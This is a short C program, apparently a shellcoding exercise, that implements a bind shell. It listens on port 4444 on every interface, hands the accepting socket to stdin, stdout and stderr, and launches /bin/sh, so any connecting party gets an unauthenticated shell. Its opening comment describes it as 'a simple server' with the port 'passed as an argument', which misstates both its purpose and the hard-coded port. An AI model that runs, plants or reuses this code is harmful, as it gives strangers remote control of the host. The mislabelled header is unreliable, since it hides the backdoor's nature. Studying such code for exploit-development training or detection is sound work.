        /* A simple server in the internet domain using TCP
           The port number is passed as an argument */
        #include <stdio.h>
        #include <unistd.h>
        #include <sys/socket.h>
        #include <netinet/in.h>

        int main(void)
        {
                 int sockfd, newsockfd, portno; //file descriptor, client file descriptor, port number
                 socklen_t clilen; //socket length for new connections

                 struct sockaddr_in serv_addr, cli_addr; //server listen address, client address

                 sockfd = socket(AF_INET, SOCK_STREAM, 0); //create TCP socket http://man7.org/linux/man-pages/man7/socket.7.html
                 portno = 4444; //port to listen on
                 serv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
                 serv_addr.sin_addr.s_addr = INADDR_ANY; // listen on any address, converted to network byte order
                 serv_addr.sin_port = htons(portno); // server port, converted to network string order
                 bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)); //bind to socket http://man7.org/linux/man-pages/man2/bind.2.html
                 listen(sockfd,0); //listen on socket http://man7.org/linux/man-pages/man2/listen.2.html
                 clilen = sizeof(cli_addr); // accept new connections
                 newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen); // accept new connections

                 // dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
                 dup2(newsockfd, 0);
                 dup2(newsockfd, 1);
                 dup2(newsockfd, 2); //http://man7.org/linux/man-pages/man2/dup.2.html

                 // execute sh shell
                 execve("/bin/sh", NULL, NULL); //http://man7.org/linux/man-pages/man2/execve.2.html
                 close(newsockfd); //close socket
                 close(sockfd); //close socket

                 return 0; 
        }
